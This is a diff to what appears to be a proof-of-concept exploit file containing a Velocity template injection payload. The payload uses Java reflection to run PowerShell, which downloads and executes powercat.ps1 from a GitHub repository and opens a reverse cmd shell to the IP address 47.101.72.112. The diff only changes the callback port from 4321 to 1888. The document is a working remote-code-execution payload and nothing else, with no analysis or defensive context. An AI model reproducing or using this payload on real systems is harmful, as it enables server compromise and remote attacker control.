@@ -1,4 +1,4 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('powershell IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/Blank233/poc/master/powercat.ps1");powercat -c 47.101.72.112 -p 4321 -e cmd'))
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('powershell IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/Blank233/poc/master/powercat.ps1");powercat -c 47.101.72.112 -p 1888 -e cmd'))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
